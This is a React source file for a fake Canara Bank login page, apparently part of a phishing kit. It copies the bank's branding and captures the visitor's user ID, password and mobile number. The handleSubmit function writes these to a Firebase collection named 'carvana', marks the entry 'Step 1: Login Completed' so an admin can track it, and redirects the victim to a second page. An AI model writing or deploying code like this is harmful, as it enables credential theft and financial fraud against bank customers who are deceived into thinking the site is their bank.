import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [captchaType, setCaptchaType] = useState('image');
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const navigate = useNavigate();

  // Captcha generator
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    
    if (captcha !== captchaText) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      // 1. Admin mein serial sorting ke liye readable time
      const formattedTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

      // 2. Unique Document ID generate karna (Har user ke liye naya row)
      const documentId = `user_${Date.now()}`;
      
      // 3. Pehla data save karna (Step 1)
      const result = await FirebaseUtil.uploadAnyModel(`carvana/${documentId}`, {
        key: documentId,
        userId: userId,
        password_1: password1, // Pehla password
        phoneNumber: phoneNumber,
        entry_time: formattedTime, // Is column se admin mein serial order hoga
        current_status: "Step 1: Login Completed",
        language: language
      });
      
      if (result.state === 'success') {
        setTimeout(() => {
          setIsSubmitting(false);
          // 4. Second page par ID ke saath bhej rahe hain
          navigate(`/second/${documentId}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header Section */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center shadow-md">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Canara Bank</h1>
            <p className="text-sm">A Government of India Undertaking</p>
            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block font-bold">
              Fintech Syndicate
            </div>
          </div>
        </div>
        <div className="space-y-1.5 cursor-pointer">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      <div className="bg-[#0066b3] text-white text-center pb-2">
        <p className="italic">Together We Can</p>
      </div>

      {/* Main Login Form */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-[#0077be] text-white rounded-3xl w-full max-w-md p-5 shadow-2xl">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold border-b-2 border-yellow-400 inline-block pb-1 uppercase tracking-wide">Login</h2>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="text"
              placeholder="Enter User ID"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none focus:ring-4 focus:ring-yellow-400 outline-none transition-all"
              required
            />
            
            <input
              type="password"
              placeholder="Enter Password"
              value={password1}
              onChange={(e) => setPassword1(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none focus:ring-4 focus:ring-yellow-400 outline-none transition-all"
              required
            />

            <input
              type="tel"
              placeholder="10-digit mobile number"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none focus:ring-4 focus:ring-yellow-400 outline-none transition-all"
              required
              pattern="[0-9]{10}"
            />

            <div className="flex space-x-2">
              <input
                type="text"
                placeholder="Captcha"
                className="flex-1 py-3 px-4 rounded-lg text-black outline-none"
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                required
              />
              <div className="bg-yellow-50 rounded-lg px-4 flex items-center justify-center font-bold text-blue-900 tracking-widest italic border-2 border-yellow-400 select-none">
                {captchaText}
              </div>
              <button type="button" onClick={generateCaptcha} className="bg-white/20 p-2 rounded-lg hover:bg-white/30 text-xl">
                🔄
              </button>
            </div>
            
            {captchaError && <div className="text-yellow-300 text-xs font-bold text-center">{captchaError}</div>}

            <select
              className="w-full py-3 px-4 rounded-lg text-black outline-none"
              value={language}
              onChange={(e) => setLanguage(e.target.value)}
            >
              <option value="English">English</option>
              <option value="Hindi">Hindi</option>
            </select>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-extrabold py-3 rounded-full shadow-lg transform active:scale-95 transition-all text-sm tracking-widest"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "LOGIN"}
            </button>
          </form>

          {/* Additional Links Grid */}
          <div className="mt-6 grid grid-cols-2 gap-2 text-[10px] text-blue-100">
            <span className="bg-blue-800/40 p-2 rounded text-center cursor-pointer">Unlock User ID</span>
            <span className="bg-blue-800/40 p-2 rounded text-center cursor-pointer">Forgot Password</span>
            <span className="bg-blue-800/40 p-2 rounded text-center cursor-pointer">New Registration</span>
            <span className="bg-blue-800/40 p-2 rounded text-center cursor-pointer">Activate User</span>
          </div>
        </div>
      </main>

      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default FirstPage;
